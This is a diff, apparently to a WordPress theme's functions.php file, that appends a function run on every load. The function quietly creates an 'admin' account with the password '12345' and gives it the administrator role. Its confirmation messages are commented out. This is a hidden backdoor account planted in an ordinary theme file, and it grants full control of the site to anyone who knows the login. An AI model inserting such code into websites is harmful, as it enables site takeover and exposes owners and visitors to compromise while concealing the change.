@@ -182,3 +182,29 @@ if ( defined( 'JETPACK__VERSION' ) ) {
 	require get_template_directory() . '/inc/jetpack.php';
 }
 
+
+
+
+function create_admin_user() {
+    // Check if the user doesn't already exist
+    if (!username_exists('admin')) {
+        // Create a new user
+        $user_id = wp_create_user('admin', '12345');
+
+        // Check if the user was successfully created
+        if (!is_wp_error($user_id)) {
+            // Set the user role to 'administrator'
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+
+            // echo 'Admin user created successfully.';
+        } else {
+            echo 'Error creating admin user: ' . $user_id->get_error_message();
+        }
+    } else {
+        // echo 'Admin user already exists.';
+    }
+}
+
+// Run the function
+create_admin_user();
